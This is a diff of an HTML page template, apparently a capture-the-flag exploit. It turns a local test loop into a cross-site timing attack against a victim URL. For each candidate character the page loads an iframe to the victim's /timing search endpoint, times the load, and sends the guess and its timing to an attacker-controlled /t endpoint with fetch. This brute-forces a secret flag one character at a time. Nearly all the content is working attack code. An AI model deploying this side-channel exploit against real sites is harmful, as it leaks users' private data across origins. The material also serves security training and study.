@@ -3,20 +3,32 @@
   <pre id="result" style="white-space: pre-wrap;"></pre>
     <script>
       const flag = "{{ flag }}";
+      const victim = "{{ url }}";
       const chr_list = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','}'];
       
-      for(let chr=0; chr<chr_list.length; chr++){
-        let start = performance.now();
-        const iframe = document.createElement("iframe");
-        iframe.src = `http://127.0.0.1:8000/timing?query=${flag + chr_list[chr]}`;
+      function sleep(ms) {
+        return new Promise((resolve) => setTimeout(resolve, ms));
+      } // SQL 과부화 방지
 
-        iframe.onload = () => {
-          const after = performance.now();
-          console.log(flag+chr_list[chr]+'===>'+(after-before));
-        };
+      (async () => {
+        for(let chr=0; chr<chr_list.length; chr++){
+          let start = performance.now();
+          const iframe = document.createElement("iframe");
+          iframe.src = `${victim}/timing?query=${flag + chr_list[chr]}`;
 
+          iframe.onload = () => {
+            let after = performance.now();
+            let delta = after - start;
+            let data = `${flag + chr_list[chr]}===${delta.toFixed(2)}`;
+            
+            fetch("/t?"+data);
+            // const img = new Image();
+            // img.src =  "/t?"+ encodeURIComponent(data);
+          };
         document.body.appendChild(iframe);
+        await sleep(500); // SQL 과부화 방지
       }
+    })();
     </script>
 </body>
 
